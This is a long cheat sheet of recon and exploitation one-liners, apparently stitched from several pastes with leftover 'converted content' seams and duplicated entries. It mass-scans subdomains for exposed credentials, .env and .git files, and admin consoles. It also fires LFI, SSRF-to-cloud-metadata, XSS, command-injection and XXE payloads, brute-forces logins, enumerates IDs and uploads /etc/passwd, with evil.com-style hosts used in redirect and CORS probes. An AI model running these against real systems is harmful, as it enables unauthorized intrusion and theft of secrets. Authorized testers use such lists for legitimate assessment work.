```

Search for Open API Keys in URLs
```bash
cat urls.txt | grep -Ei 'apikey|api_key|token' > exposed_api_keys.txt
```

Detect Exposed .bash_history Files
```bash
cat subdomains.txt | httpx -silent -path /.bash_history -mc 200 -o bash_history_exposed.txt
```

Check for Open etc/passwd via LFI
```bash
cat urls.txt | qsreplace '../../../../../etc/passwd' | httpx -silent -fr 'root:x:' -o lfi_passwd.txt
```

Find Open Exposed Backup ZIP Files
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/site_backup.zip\n/db_backup.zip') -mc 200 -o backup_zip_exposed.txt
```

Detect Exposed Logs (server.log, error.log)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/server.log\n/error.log\n/application.log') -mc 200 -o exposed_logs.txt
```

Find Publicly Accessible Admin Panels (General)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/admin\n/administrator\n/admin/login\n/admin.php\n/adminer.php') -mc 200 -o open_admin_panels.txt
```

Detect Exposed YAML Config Files
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/config.yaml\n/application.yaml') -mc 200 -o exposed_yaml.txt
```

Check for Directory Traversal to Windows Files
```bash
cat urls.txt | qsreplace 'C:\Windows\win.ini' | httpx -silent -fr 'for 16-bit app support' -o windows_lfi.txt
```

Find Open Jupyter Notebooks (No Auth)
```bash
cat subdomains.txt | httpx -silent -path /tree -mc 200 -o open_jupyter.txt
```

Identify Server Error Pages (500 Errors)
```bash
cat urls.txt | httpx -silent -mc 500 -o server_errors.txt
```

Check for Open SNMP Services
```bash
cat ips.txt | naabu -p 161 -silent -o open_snmp.txt
```

Find Exposed Laravel Environment Files (.env)
```bash
cat subdomains.txt | httpx -silent -path /.env -mc 200 -o exposed_env_files.txt
```

Detect Git Repository Exposures (.git/config)
```bash
cat subdomains.txt | httpx -silent -path /.git/config -mc 200 -o exposed_git_configs.txt
```

Look for Exposed Dockerfiles
```bash
cat subdomains.txt | httpx -silent -path /Dockerfile -mc 200 -o exposed_dockerfiles.txt
```

Identify Publicly Accessible AWS Credentials
```bash
cat subdomains.txt | httpx -silent -path /aws/credentials -mc 200 -o exposed_aws_credentials.txt
```

Search for Backup Database Dumps (SQL, SQLite)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/db.sql\n/database.sql\n/dump.sql\n/backup.db') -mc 200 -o db_dumps.txt
```
Here’s the converted content:

Detect Exposed SSL Certificates (pem)
```bash
cat subdomains.txt | httpx -silent -path /ssl/cert.pem -mc 200 -o exposed_ssl.txt
```

Find Open Configuration.php Files (Joomla)
```bash
cat subdomains.txt | httpx -silent -path /configuration.php -mc 200 -o joomla_config_exposed.txt
```

Hunt for Open Jenkins Dashboards
```bash
cat subdomains.txt | httpx -silent -path /jenkins -mc 200 -o open_jenkins.txt
```

Detect Exposed Magento Admin Panels
```bash
cat subdomains.txt | httpx -silent -path /admin -mc 200 -o magento_admin.txt
```

Check for Exposed API Documentation (Swagger UI)
```bash
cat subdomains.txt | httpx -silent -path /swagger-ui.html -mc 200 -o swagger_exposed.txt
```

Detect GitLab or GitHub Enterprise Instances
```bash
cat subdomains.txt | httpx -silent -path /users/sign_in -mc 200 -o gitlab_or_ghe.txt
```

Find Misconfigured CORS (Wildcard)
```bash
cat urls.txt | httpx -silent -H "Origin: https://evil.com" -fr 'Access-Control-Allow-Origin: https://evil.com' -o cors_misconfig.txt
```

Scan for Server Status Pages (Apache/Nginx)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/server-status\n/nginx_status') -mc 200 -o server_status_exposed.txt
```

Identify Exposed Debug Pages (PHP Info)
```bash
cat subdomains.txt | httpx -silent -path /phpinfo.php -mc 200 -o phpinfo_exposed.txt
```

Detect Open Redis Stats Pages (Unprotected UI)
```bash
cat subdomains.txt | httpx -silent -path /redis -mc 200 -o redis_ui_exposed.txt
```

Scan for Exposed Kubernetes Dashboard
```bash
cat subdomains.txt | httpx -silent -path /api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/ -mc 200 -o k8s_dashboard_exposed.txt
```

Look for GraphQL Playground
```bash
cat subdomains.txt | httpx -silent -path /playground -mc 200 -o graphql_playground_exposed.txt
```

Find Exposed OpenAPI Spec Files (openapi.json)
```bash
cat subdomains.txt | httpx -silent -path /openapi.json -mc 200 -o openapi_exposed.txt
```

Scan for Exposed GCP Metadata Servers
```bash
cat ips.txt | naabu -p 80,443 -silent | httpx -path /computeMetadata/v1/ -H 'Metadata-Flavor: Google' -mc 200 -o gcp_metadata_exposed.txt
```

Find Exposed Jenkins Console Logs
```bash
cat subdomains.txt | httpx -silent -path /console -mc 200 -o jenkins_console_logs.txt
```

Check for Open Jira Dashboards (Exposed Tickets)
```bash
cat subdomains.txt | httpx -silent -path /secure/Dashboard.jspa -mc 200 -o jira_exposed.txt
```

Detect Exposed Env Variables via /env (SpringBoot)
```bash
cat subdomains.txt | httpx -silent -path /env -mc 200 -o springboot_env_exposed.txt
```

Find Misconfigured GitHub Actions Workflows (YAML)
```bash
cat subdomains.txt | gauplus | grep -Ei '.github/workflows/.*\.yml' > github_workflows_exposed.txt
```

Scan for Default Admin Credentials on Login Pages
```bash
cat urls.txt | nuclei -t cves/ -tags 'default-login' -o default_creds.txt
```

Check for Misconfigured Prometheus Servers
```bash
cat subdomains.txt | httpx -silent -path /graph -mc 200 -o prometheus_exposed.txt
```

Find Exposed Backup Files (ZIP, TAR, SQL)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/backup.tar.gz\n/dump.sql') -mc 200 -o exposed_backups.txt
```

Detect Exposed Open Directory Listings
```bash
cat subdomains.txt | httpx -silent -fr '<title>Index of /' -o open_directories.txt
```

Here is the converted content:

Find Open Jenkins Script Console (RCE Point)
```bash
cat subdomains.txt | httpx -silent -path /script -mc 200 -o jenkins_script_console.txt
```

Scan for Exposed Kubernetes Kubelet APIs (Unauth Access)
```bash
cat ips.txt | httpx -silent -path /pods -mc 200 -o kubelet_exposed.txt
```

Look for Apache Struts Vulnerable Endpoints
```bash
cat subdomains.txt | httpx -silent -path /struts2-showcase/index.action -mc 200 -o struts_vuln.txt
```

Identify Open Tomcat Manager Consoles
```bash
cat subdomains.txt | httpx -silent -path /manager/html -mc 200 -o tomcat_manager_open.txt
```

Detect CVE-2021-3129 (Laravel Debug Mode RCE)
```bash
cat subdomains.txt | httpx -silent -path /_ignition/execute-solution -mc 200 -o laravel_rce.txt
```

Find Exposed Config.json / settings.json
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/config.json\n/settings.json') -mc 200 -o exposed_json_configs.txt
```

Check for Outdated WordPress (Version Leak)
```bash
cat subdomains.txt | httpx -silent -path /readme.html -mc 200 -o wordpress_version.txt
```

Find Exposed Log Files (.log)
```bash
cat subdomains.txt | httpx -silent -path /error.log -mc 200 -o exposed_logs.txt
```

Detect Misconfigured GraphQL Endpoints (Introspection Enabled)
```bash
cat subdomains.txt | httpx -silent -path /graphql -H 'Content-Type: application/json' -d '{"query":"query IntrospectionQuery {__schema { queryType { name }}}"}' -o graphql_introspection_enabled.txt
```

Scan for Exposed Config.php in WordPress / Joomla
```bash
cat subdomains.txt | httpx -silent -path /wp-config.php -mc 200 -o wp_config_exposed.txt
```

Detect Open API Endpoints (via common paths)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/api/v1/\n/api/\n/api/v2/\n/app_dev.php/api/') -mc 200 -o open_api_endpoints.txt
```

Check for Exposed GitHub Personal Access Tokens (PATs)
```bash
cat subdomains.txt | gauplus | grep -E 'token=[a-z0-9]+' > github_tokens_leak.txt
```

Find Misconfigured AWS Buckets (S3)
```bash
cat subdomains.txt | httpx -silent -path / -mc 200 -o s3_buckets_exposed.txt
```

Scan for Exposed Laravel Log Files
```bash
cat subdomains.txt | httpx -silent -path /storage/logs/laravel.log -mc 200 -o laravel_log_exposed.txt
```

Check for Outdated Apache Version via Server Header
```bash
cat subdomains.txt | httpx -silent -fr 'Server: Apache/2.4' -o outdated_apache.txt
```

Detect PHPMyAdmin Open Login Pages
```bash
cat subdomains.txt | httpx -silent -path /phpmyadmin -mc 200 -o phpmyadmin_open.txt
```

Look for Unprotected Kibana Instances
```bash
cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o kibana_open.txt
```

Scan for Public Grafana Dashboards
```bash
cat subdomains.txt | httpx -silent -path /login -mc 200 -o grafana_login_open.txt
```

Search for Common Backup Extensions (bak, old, save)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/index.php.bak\n/config.old\n/config.save') -mc 200 -o backup_files_exposed.txt
```

Find Misconfigured ElasticSearch Instances (Public Index)
```bash
cat ips.txt | httpx -silent -path /_cat/indices?v -mc 200 -o elasticsearch_exposed.txt
```

Look for Exposed Jenkins Build Logs
```bash
cat subdomains.txt | httpx -silent -path /job/test/lastBuild/consoleText -mc 200 -o jenkins_build_logs.txt
```
Here is the converted content:

Find Open Adminer DB Management Tools
```bash
cat subdomains.txt | httpx -silent -path /adminer.php -mc 200 -o adminer_exposed.txt
```

Detect Exposed SVN Directories
```bash
cat subdomains.txt | httpx -silent -path /.svn/entries -mc 200 -o svn_exposed.txt
```

Detect Exposed .git Repos (Source Code Leak)
```bash
cat subdomains.txt | httpx -silent -path /.git/config -mc 200 -o git_exposed.txt
```

Find Sensitive Files using common patterns (env, db creds, ssh keys)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/.env\n/database.yml\n/id_rsa\n/config.php\n/secrets.yml') -mc 200 -o sensitive_files.txt
```

Detect Exposed Docker and Kubernetes Dashboard
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy\n/docker') -mc 200 -o kube_docker_exposed.txt
```

Scan for Exposed Environment Variables in Responses
```bash
cat subdomains.txt | httpx -silent -fr 'AWS_ACCESS_KEY_ID|SECRET_KEY|DB_PASSWORD' -o secrets_in_response.txt
```

Find Public Swagger API Documentation (API Discovery)
```bash
cat subdomains.txt | httpx -silent -path /swagger.json -mc 200 -o swagger_exposed.txt
```

Check for Exposed Server-Status Pages (Apache/Nginx Debug Info)
```bash
cat subdomains.txt | httpx -silent -path /server-status -mc 200 -o server_status_exposed.txt
```

Scan for Open Redis, Memcached, MongoDB Ports (Unauth Access)
```bash
naabu -list subdomains.txt -ports 6379,11211,27017 -silent -o open_db_ports.txt
```

Identify Publicly Accessible .DS_Store (File Disclosure)
```bash
cat subdomains.txt | httpx -silent -path /.DS_Store -mc 200 -o ds_store_exposed.txt
```

Find Exposed Wordpress Debug Log (Sensitive Info)
```bash
cat subdomains.txt | httpx -silent -path /wp-content/debug.log -mc 200 -o wp_debug_log.txt
```

Check for Exposed Internal IP in Responses (SSR Leak)
```bash
cat subdomains.txt | httpx -silent -fr '10\.|192\.168\.|172\.' -o internal_ip_leak.txt
```

Find Laravel Env Leak via Incorrect Env Handler
```bash
cat subdomains.txt | httpx -silent -path /.env -mc 200 -o laravel_env_leak.txt
```

Scan for Exposed Backup Folders
```bash
cat subdomains.txt | httpx -silent -path /backup -mc 200 -o backup_folder_exposed.txt
```

Look for Open Joomla Installers
```bash
cat subdomains.txt | httpx -silent -path /installation/index.php -mc 200 -o joomla_installer.txt
```

Detect Exposed Debug Pages (debug=true)
```bash
cat subdomains.txt | httpx -silent -fr 'debug=true' -o debug_pages.txt
```

Find Open Jira Dashboards
```bash
cat subdomains.txt | httpx -silent -path /secure/Dashboard.jspa -mc 200 -o jira_open.txt
```

Scan for Exposed Backup Files (config.old, index.bak)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/config.old\n/index.bak\n/wp-config.php.save') -mc 200 -o backup_leaks.txt
```

Detect Open Admin Portals (Common Paths)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/admin\n/login\n/dashboard\n/console') -mc 200 -o open_admin_portals.txt
```

Find Exposed Debug Toolbar (Django Debug)
```bash
cat subdomains.txt | httpx -silent -path /__debug__/ -mc 200 -o django_debug_toolbar.txt
```

Here is the converted content:

Detect Open Directories with Readable Files
```bash
cat subdomains.txt | httpx -silent -fr '<title>Index of /' -o open_directory_listing.txt
```

Identify Exposed Proxy Logs (Squid / HAProxy)
```bash
cat subdomains.txt | httpx -silent -path /var/log/squid/access.log -mc 200 -o proxy_logs_exposed.txt
```

Check for Public WebSockets Endpoints (Leaky API)
```bash
cat subdomains.txt | httpx -silent -path /socket.io -mc 200 -o websocket_exposed.txt
```

Find Public GraphQL Consoles (Interactive API)
```bash
cat subdomains.txt | httpx -silent -path /graphiql -mc 200 -o graphiql_open.txt
```

Scan for Open Hadoop Resource Manager
```bash
cat subdomains.txt | httpx -silent -path /ws/v1/cluster/info -mc 200 -o hadoop_exposed.txt
```

Detect Exposed PHPInfo Pages (Info Disclosure)
```bash
cat subdomains.txt | httpx -silent -path /phpinfo.php -mc 200 -o phpinfo_exposed.txt
```

Find Publicly Accessible Wordpress XMLRPC (Brute Force Possible)
```bash
cat subdomains.txt | httpx -silent -path /xmlrpc.php -mc 200 -o xmlrpc_open.txt
```

Detect Open ElasticSearch Instances (Data Exposure)
```bash
naabu -list subdomains.txt -p 9200 -silent | httpx -silent -path /_cat/indices?v -mc 200 -o open_elasticsearch.txt
```

Scan for Open Kubernetes Config (Cluster Info Leak)
```bash
cat subdomains.txt | httpx -silent -path /.kube/config -mc 200 -o kube_config_exposed.txt
```

Find GraphQL Endpoints with Introspection Enabled
```bash
cat subdomains.txt | httpx -silent -path /graphql -mc 200 -fr 'Introspection' -o graphql_introspection.txt
```

Detect Misconfigured CORS (Allow-Origin: )
```bash
cat subdomains.txt | httpx -silent -H "Origin: https://evil.com" -fr 'Access-Control-Allow-Origin: \*' -o cors_misconfig.txt
```

Look for Exposed Adminer (DB Management Tool)
```bash
cat subdomains.txt | httpx -silent -path /adminer.php -mc 200 -o adminer_exposed.txt
```

Detect Open Redis Commander UI (Unauth Control)
```bash
cat subdomains.txt | httpx -silent -path /redis/ -mc 200 -o redis_ui_exposed.txt
```

Find Public GitLab CI/CD Config (Pipeline Disclosure)
```bash
cat subdomains.txt | httpx -silent -path /.gitlab-ci.yml -mc 200 -o gitlab_ci_exposed.txt
```

Scan for Open Debug Mode in Flask Apps
```bash
cat subdomains.txt | httpx -silent -path /console -mc 200 -o flask_debug_console.txt
```

Detect Open Exim/Webmin Panels
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/exim\n/webmin') -mc 200 -o open_exim_webmin.txt
```

Find Exposed Laravel Log Files (App Key Disclosure)
```bash
cat subdomains.txt | httpx -silent -path /storage/logs/laravel.log -mc 200 -o laravel_logs_exposed.txt
```

Detect Public AWS Config Files (Credentials Leak)
```bash
cat subdomains.txt | httpx -silent -path /.aws/credentials -mc 200 -o aws_creds_exposed.txt
```

Identify Open Favicon Files and Fingerprint Services
```bash
cat subdomains.txt | httpx -silent -path /favicon.ico -o favicons/ && for icon in favicons/*; do shasum -a 256 $icon; done
```

Check for Exposed GitHub Workflow Files (.github/workflows)
```bash
cat subdomains.txt | httpx -silent -path /.github/workflows/ -mc 200 -o github_workflows_exposed.txt
```

Find Jenkins Consoles with Anon Access
```bash
cat subdomains.txt | httpx -silent -path /script -mc 200 -o jenkins_console.txt
```

Scan for Default Tomcat Admin Panels
```bash
cat subdomains.txt | httpx -silent -path /manager/html -mc 200 -o tomcat_admin_exposed.txt
```

Here is the converted content:

Look for Public Backup Files (tar/zip dumps)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/backup.tar.gz\n/db.sql') -mc 200 -o exposed_backups.txt
```

Check for Exposed Laravel Telescope Panels
```bash
cat subdomains.txt | httpx -silent -path /telescope -mc 200 -o laravel_telescope.txt
```

Find Exposed VNC/TeamViewer/Web RDP
```bash
naabu -list subdomains.txt -p 5900,3389 -silent -o remote_access_ports.txt
```

Detect Open Grafana Panels (Unauth Access)
```bash
cat subdomains.txt | httpx -silent -path /login -mc 200 -fr 'Grafana' -o open_grafana.txt
```

Scan for Misconfigured API Endpoints
```bash
cat subdomains.txt | nuclei -t misconfiguration/api-misconfiguration.yaml -o api_misconfigs.txt
```

Identify Exposed Internal DNS Resolvers
```bash
cat subdomains.txt | dnsx -a -resp-only -silent | grep -E '10\.|192\.168\.|172\.' -o internal_dns.txt
```

Detect Anonymous FTP Access (File Exposure)
```bash
nmap -p 21 --script ftp-anon -iL subdomains.txt -oN ftp_anon_scan.txt
```

Find Exposed Configuration Pages (config.php)
```bash
cat subdomains.txt | httpx -silent -path /config.php -mc 200 -o config_php_exposed.txt
```

Identify Publicly Available Magento Admin Panels
```bash
cat subdomains.txt | httpx -silent -path /admin -mc 200 -fr 'Magento' -o magento_admin_exposed.txt
```

Check for SSRF by Detecting Response Based Redirects
```bash
cat subdomains.txt | httpx -silent -H "X-Forwarded-For: attacker.com" -fr 'Location: attacker.com' -o ssrf_possible.txt
```

Detect Exposed Env Files (.env with Secrets)
```bash
cat subdomains.txt | httpx -silent -path /.env -mc 200 -o exposed_env_files.txt
```

Find XMLRPC Enabled on WordPress (Brute Force Vector)
```bash
cat subdomains.txt | httpx -silent -path /xmlrpc.php -mc 200 -o wordpress_xmlrpc.txt
```

Identify Open Kibana Dashboards (Sensitive Logs)
```bash
cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o open_kibana.txt
```

Find Servers Exposing phpinfo() (Sensitive Config)
```bash
cat subdomains.txt | httpx -silent -path /phpinfo.php -mc 200 -o phpinfo_exposed.txt
```

Detect Publicly Accessible Swagger APIs
```bash
cat subdomains.txt | httpx -silent -path /swagger-ui/ -mc 200 -o swagger_exposed.txt
```

Search for SQL Dumps and Backup Files (db.sql/db.zip)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/db.sql\n/backup.sql\n/database.sql') -mc 200 -o sql_dumps_exposed.txt
```

Detect LFI Points (path traversal)
```bash
cat subdomains.txt | gf lfi | httpx -silent -o lfi_possible_urls.txt
```

Identify Reflected XSS via GET Parameters
```bash
cat subdomains.txt | gf xss | qsreplace '"><img src=x onerror=alert(document.domain)>' | httpx -silent -fr '"><img src=x onerror=alert' -o reflected_xss.txt
```

Find Outdated WordPress Versions (Vuln Detection)
```bash
cat subdomains.txt | httpx -silent -path /readme.html -mc 200 -o wordpress_readme.txt
```

Search for PHPMyAdmin Exposed Panels
```bash
cat subdomains.txt | httpx -silent -path /phpmyadmin -mc 200 -o phpmyadmin_exposed.txt
```

Detect Command Injection Points
```bash
cat subdomains.txt | gf command-injection | qsreplace ';id' | httpx -silent -fr 'uid=' -o cmd_injection.txt
```

Here is the converted content:

Find Exposed Docker Daemon API (Remote Control)
```bash
naabu -list subdomains.txt -p 2375 -silent | httpx -silent -o docker_api_exposed.txt
```

Identify Open Git Directories (.git Exposed)
```bash
cat subdomains.txt | httpx -silent -path /.git/config -mc 200 -o git_dirs_exposed.txt
```

Scan for Exposed Server Status Pages (Apache/Nginx)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/server-status\n/nginx-status') -mc 200 -o server_status_exposed.txt
```

Detect Open Jenkins Panels with Script Console
```bash
cat subdomains.txt | httpx -silent -path /script -mc 200 -o jenkins_script_console.txt
```

Find Exposed AWS S3 Buckets via Subdomains
```bash
cat subdomains.txt | nuclei -t s3-detect.yaml -o open_s3_buckets.txt
```

Search for Potential Open Redirects (Unsafe Redirects)
```bash
cat subdomains.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects.txt
```

Find Debug/Error Pages (Sensitive Stacktrace)
```bash
cat subdomains.txt | httpx -silent -sc -fr 'error\|exception\|trace' -o error_pages.txt
```

Detect Exposed Jenkins API Endpoints
```bash
cat subdomains.txt | httpx -silent -path /api/json -mc 200 -o jenkins_api_exposed.txt
```

Find Exposed Kubernetes Dashboard (Cluster Control)
```bash
cat subdomains.txt | httpx -silent -path /api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/ -mc 200 -o k8s_dashboard_exposed.txt
```

Detect SSRF via Open Redirect Chains
```bash
cat subdomains.txt | gf ssrf | qsreplace 'http://169.254.169.254/latest/meta-data/' | httpx -silent -fr 'ami-id\|instance-id' -o ssrf_exploitable.txt
```

Look for Backup or Archive Files (tar.gz, zip)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.tar.gz\n/site-backup.zip') -mc 200 -o backup_files_exposed.txt
```

Identify Known Vulnerable CMS Versions
```bash
nuclei -l subdomains.txt -t cves/ -o cms_cve_vulns.txt
```

Find JWT Tokens or Sensitive Tokens in Responses
```bash
cat subdomains.txt | httpx -silent -sr | grep -Eo 'eyJ[^"]+' | tee jwt_tokens.txt
```

Detect Basic Auth Protected Pages (Bruteforce Target)
```bash
cat subdomains.txt | httpx -silent -sc -H "Authorization: Basic fakeauth" -o basic_auth_detected.txt
```

Detect Exposed .git Repositories (Full Source Code Leak)
```bash
cat subdomains.txt | httpx -silent -path /.git/config -mc 200 -o exposed_git_repos.txt
```

Find Public .DS_Store Files (Directory Listing Exposure)
```bash
cat subdomains.txt | httpx -silent -path /.DS_Store -mc 200 -o ds_store_exposed.txt
```

Scan for Exposed .svn Repos (Source Code Leak)
```bash
cat subdomains.txt | httpx -silent -path /.svn/entries -mc 200 -o svn_repos_exposed.txt
```

Find Open GraphQL Endpoints (GraphQL Injection)
```bash
cat subdomains.txt | httpx -silent -path /graphql -mc 200 -o graphql_exposed.txt
```

Detect Exposed Laravel Debug Pages (Full App Secrets)
```bash
cat subdomains.txt | httpx -silent -path /_ignition/health-check -mc 200 -o laravel_debug_exposed.txt
```

Check for File Upload Points (RCE Chances)
```bash
cat subdomains.txt | gf upload | httpx -silent -o file_upload_points.txt
```

Find XML External Entity (XXE) Injection Points
```bash
cat subdomains.txt | gf xxe | qsreplace 'file:///etc/passwd' | httpx -silent -fr 'root:x' -o xxe_exploitable.txt
```
Here is the converted content:

Detect Misconfigured AWS Cognito Pools (Token Takeover)
```bash
cat subdomains.txt | nuclei -t misconfiguration/cognito-detect.yaml -o aws_cognito_misconfig.txt
```

Scan for Open Cloud Storage Buckets (GCP/Azure)
```bash
cat subdomains.txt | nuclei -t exposed-storage/ -o cloud_buckets_exposed.txt
```

Find Sensitive Files via URL Fuzzing
```bash
ffuf -u FUZZ -w wordlists/sensitive-files.txt -mc 200 -o sensitive_files_found.txt
```

Detect Open Prometheus Panels (Monitoring Exposure)
```bash
cat subdomains.txt | httpx -silent -path /graph -mc 200 -o prometheus_exposed.txt
```

Find Open Redirection in APIs
```bash
cat subdomains.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects_apis.txt
```

Detect Misconfigured CORS (Any Origin Allowed)
```bash
cat subdomains.txt | httpx -silent -H "Origin: https://evil.com" -fr "access-control-allow-origin: https://evil.com" -o misconfigured_cors.txt
```

Detect Backup Archives (Zip/Tar Files)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/backup.tar.gz\n/site-backup.zip') -mc 200 -o backup_archives_found.txt
```

Find Exposed Debug Logs (Stack Traces, Errors)
```bash
cat subdomains.txt | httpx -silent -path /debug.log -mc 200 -o debug_logs_exposed.txt
```

Scan for SSRF via Parameter Fuzzing
```bash
cat subdomains.txt | gf ssrf | qsreplace 'http://169.254.169.254/latest/meta-data/' | httpx -silent -fr 'ami-id\|instance-id' -o ssrf_targets.txt
```

Identify Server Headers for Misconfig Analysis
```bash
cat subdomains.txt | httpx -silent -sc -H 'X-Check: true' -o headers_info.txt
```

Detect Missing Security Headers (Hardening Issues)
```bash
cat subdomains.txt | nuclei -t security-misconfiguration/ -o missing_security_headers.txt
```

Find Exposed WordPress Debug Logs
```bash
cat subdomains.txt | httpx -silent -path /wp-content/debug.log -mc 200 -o wordpress_debug_log.txt
```

Detect Exposed GITLAB CI Files (Pipeline Secrets)
```bash
cat subdomains.txt | httpx -silent -path /.gitlab-ci.yml -mc 200 -o gitlab_ci_exposed.txt
```

Find API Keys Leaked in JS Files
```bash
katana -list subdomains.txt -silent -js | grep -E 'apiKey|client_secret|access_token' -o api_keys_leaked.txt
```

Detect Old PHPMyAdmin Panels (Known Vulns)
```bash
cat subdomains.txt | httpx -silent -path /phpmyadmin/ -mc 200 -o phpmyadmin_found.txt
```

Identify Exposed Kibana Panels (Log Monitoring)
```bash
cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o kibana_panels_exposed.txt
```

Scan for Path Traversal (../../etc/passwd)
```bash
cat subdomains.txt | gf lfi | qsreplace '../../etc/passwd' | httpx -silent -fr 'root:x' -o path_traversal_found.txt
```

Find Open Admin Panels (Unprotected Login)
```bash
cat subdomains.txt | nuclei -t exposed-panels/ -o admin_panels_exposed.txt
```

Detect Known CVEs via Nuclei (Automated Vuln Scan)
```bash
nuclei -l subdomains.txt -t cves/ -o known_cves_found.txt
```

Identify Unsafe Redirects (via Location Header)
```bash
cat subdomains.txt | httpx -silent -sc -o redirects.txt && cat redirects.txt | grep 'Location:' | grep -i 'http'
```

Find Kubernetes Dashboard Exposures
```bash
cat subdomains.txt | httpx -silent -path /api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/ -mc 200 -o k8s_dashboard_exposed.txt
```

Here is the converted content:

Exposed Swagger / API Documentation  
```bash
curl -s https://target.com/swagger.json
```

Admin Panel Discovery (CMS Detection)  
```bash
curl -s https://target.com/admin/ | grep -i 'cms'
```

GCP Metadata SSRF Check  
```bash
curl "https://target.com/?url=http://metadata.google.internal/computeMetadata/v1/ -H 'Metadata-Flavor: Google'"
```

Azure Metadata Leak via SSRF  
```bash
curl "https://target.com/?url=http://169.254.169.254/metadata/instance?api-version=2021-01-01" -H "Metadata: true"
```

OAuth Token Leak in Referrer  
```bash
curl -I https://target.com/oauth/callback?code=abcd1234
```

AWS Keys Hunt in Public Repos (with GitHub CLI)  
```bash
gh search code "AWS_ACCESS_KEY_ID" --language python --limit 100
```

IDOR via Incrementing Document IDs  
```bash
for id in $(seq 1 100); do curl -s https://target.com/documents/$id; done
```

Sensitive Backup File Discovery  
```bash
curl -I https://target.com/config.bak
```

JWT Key Disclosure via Well-Known File  
```bash
curl -s https://target.com/.well-known/jwks.json
```

Mobile Deep Link Misconfig Check  
```bash
adb shell am start -a android.intent.action.VIEW -d "target://app/link?param=test"
```

Testing Rate Limiting (Brute Force)  
```bash
seq 1 1000 | xargs -P10 -I{} curl -X POST "https://target.com/api/login" -d 'user=admin&password=wrong{}'
```

Client-Side Security Headers Audit  
```bash
curl -I https://target.com | grep -Ei 'strict-transport|content-security|x-frame'
```

Session Fixation Check  
Reuse session after login/logout:  
```bash
curl -c cookies.txt https://target.com/login && curl -b cookies.txt https://target.com/dashboard
```

Exposed Debug Endpoints  
```bash
curl -s https://target.com/debug/vars
```

Direct Database Query via GraphQL  
```bash
curl -X POST https://target.com/graphql -d '{"query":"{users{username,password}}"}'
```

DNS Zone Transfer Misconfig (AXFR)  
```bash
dig axfr target.com @ns1.target.com
```

Misconfigured CNAME Takeover  
```bash
dig cname subdomain.target.com
```

LFI via Parameter Tampering  
```bash
curl "https://target.com/page?file=../../../../etc/passwd"
```

WebSocket Security Check (Frame Injection)  
```bash
wscat -c ws://target.com/socket
```

Sensitive Parameter Brute Force  
```bash
cat params.txt | xargs -I{} curl -s "https://target.com/?{}=test"
```
Here’s the conversion for the provided content:

GraphQL Introspection Check  
```bash
curl -X POST https://target.com/graphql -d '{"query":"{__schema{types{name}}}"}'
```

Public GitHub Secrets Hunt  
```bash
gh search code "api_key" --repo target/repo
```

CSP Bypass Discovery  
```bash
curl -I https://target.com | grep -i content-security-policy
```

Kubernetes Dashboard Exposure  
```bash
curl -k https://target.com/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/
```

Google Dorking One-Liner  
```bash
xdg-open "https://www.google.com/search?q=site:target.com filetype:env"
```

Firebase Database Exposure Check  
```bash
curl -s https://target.firebaseio.com/.json
```

Header Injection Test  
```bash
curl -I "https://target.com/%0D%0AX-Test:evil"
```

AWS S3 Bucket Direct List  
```bash
curl https://target.s3.amazonaws.com/
```

Test SSRF via Redirect  
```bash
curl "https://target.com/redirect?url=http://169.254.169.254"
```

Test Command Injection via Headers  
```bash
curl -H "User-Agent: ;id" https://target.com/
```

Exposed Git Folder  
```bash
curl -s https://target.com/.git/config
```

GCP Storage Bucket Exposure  
```bash
curl -s https://storage.googleapis.com/target-bucket-name/
```

Open Redirect Discovery  
```bash
curl -I "https://target.com/redirect?url=https://evil.com"
```

Fast Path Traversal Discovery  
```bash
curl "https://target.com/download?file=../../../../etc/passwd"
```

Testing File Upload Handling  
```bash
curl -F "file=@/etc/passwd" https://target.com/upload
```

Subdomain Takeover Check (CNAME)  
```bash
dig cname sub.target.com
```

Check for Anonymous FTP Access  
```bash
ftp target.com
```

Backup Files Finder  
```bash
curl -I https://target.com/index.php.bak
```

CloudFront Misconfiguration Detection  
```bash
curl -I https://target.cloudfront.net
```

Public Trello/Slack Links in Code  
```bash
gh search code "trello.com/b/" --repo target/repo
```

Email Spoofing via Misconfigured SPF  
```bash
dig txt target.com
```

Weak JWT Secret Guessing  
```bash
echo -n 'eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VyIjogImFkbWluIn0' | base64 -d
```

Test for Public Firebase Storage  
```bash
curl -s https://target.firebaseio.com/.json
```

Unrestricted File Download (Insecure Direct Object Reference)  
```bash
curl -s https://target.com/files/1.pdf
```

Discover Admin Portals  
```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Check for Debug Endpoints  
```bash
curl -s https://target.com/debug/vars
```
Here’s the converted content:

**Server Header Disclosure**  
